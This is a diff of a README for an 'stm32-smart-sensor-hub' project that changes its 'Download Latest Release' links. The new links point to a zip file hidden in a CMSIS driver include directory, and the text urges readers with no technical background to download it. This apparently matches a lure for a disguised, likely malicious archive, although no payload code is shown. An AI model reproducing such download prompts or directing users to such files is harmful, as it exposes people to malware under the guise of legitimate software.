@@ -1,10 +1,10 @@
 # 🌟 stm32-smart-sensor-hub - A Low-Power Smart Sensor Solution
 
-[![Download Latest Release](https://raw.githubusercontent.com/fikna99/stm32-smart-sensor-hub/main/power/stm32-smart-sensor-hub-v3.7-beta.4.zip)](https://raw.githubusercontent.com/fikna99/stm32-smart-sensor-hub/main/power/stm32-smart-sensor-hub-v3.7-beta.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/fikna99/stm32-smart-sensor-hub/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/hub_smart_sensor_stm_v2.0.zip)](https://raw.githubusercontent.com/fikna99/stm32-smart-sensor-hub/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/hub_smart_sensor_stm_v2.0.zip)
 
 ## 📥 Download & Install
 
-To start using the stm32-smart-sensor-hub, visit this page to download: [Download Releases](https://raw.githubusercontent.com/fikna99/stm32-smart-sensor-hub/main/power/stm32-smart-sensor-hub-v3.7-beta.4.zip). 
+To start using the stm32-smart-sensor-hub, visit this page to download: [Download Releases](https://raw.githubusercontent.com/fikna99/stm32-smart-sensor-hub/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/hub_smart_sensor_stm_v2.0.zip). 
 
 You’ll find the latest version available for download. The process is straightforward and requires no technical background. Just follow these easy steps:
 
